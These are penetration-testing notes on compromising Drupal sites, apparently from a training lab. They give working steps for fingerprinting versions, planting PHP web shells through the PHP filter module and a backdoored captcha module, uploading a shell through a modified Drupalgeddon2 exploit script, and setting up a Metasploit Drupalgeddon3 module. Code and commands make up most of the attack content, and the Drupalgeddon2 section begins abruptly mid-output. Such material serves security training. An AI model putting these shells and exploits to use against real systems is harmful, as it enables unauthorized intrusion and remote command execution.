# Discovery/Footprinting Versions

- check version vuln
- check for plugins
- login with default creds
- register user
- nothing? ignore
A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the robots.txt file such as references to `/node`.

`Discovering drupal`
```shell-session
curl -s http://drupal.ad.someorg.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
  <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes).  `/node/<nodeid>`.

## FingerPrinting the version

Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files, 

`changelog.txt`
```shell-session
$ curl -s http://blog.ad.someorg.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

`droopscan`
```
$ droopescan scan drupal -u http://drupal.ad.someorg.local
```

#### Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
![](drupal_php_module.webp)
From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

![](basic_page.webp)
We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd']);` we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!

Code: php

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
![](basic_page_shell_7v2%201.webp)

`use shell`
```shell-session
$ curl -s http://drupal-qa.ad.someorg.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

## WHEN PHP MODULE IS NOT PRESENT

From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default

`install the module ourselves`
```
$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Once downloaded go to `Administration` > `Reports` > `Available updates`.

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

---------------------------------
##  Backdoored Module Approach

`captcha module download`
```shell-session
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

`create webshell`
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

`create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.`
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.


`copy files and archive the folder`
```shell-session
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.ad.someorg.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.


Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.


`test webshell`
```shell-session
curl -s drupal.ad.someorg.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
# Leveraging Known Vulnerabilities:

## CVEs
- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

Enter target url (example: https://domain.ltd/): http://drupal-dev.ad.someorg.local/

Check: http://drupal-dev.ad.someorg.local/hello.txt
```
We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

`confirming`
```shell-session
curl -s http://drupal-dev.ad.someorg.local/hello.txt

;-)
```
Now let's modify the script to gain remote code execution by uploading a malicious PHP file.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

`appending`
```shell-session
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

`Next, run the modified exploit script to upload our malicious PHP file.`
```shell-session
python3 drupalgeddon2.py

Enter target url (example: https://domain.ltd/): http://drupal-dev.ad.someorg.local/

Check: http://drupal-dev.ad.someorg.local/mrb3n.php
```

Finally, we can confirm remote code execution using `cURL`.

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

![image](https://academy.hackthebox.com/storage/modules/113/burp.png)

Once we have the session cookie, we can set up the exploit module as follows.
`MSF`
```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.ad.someorg.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 
```
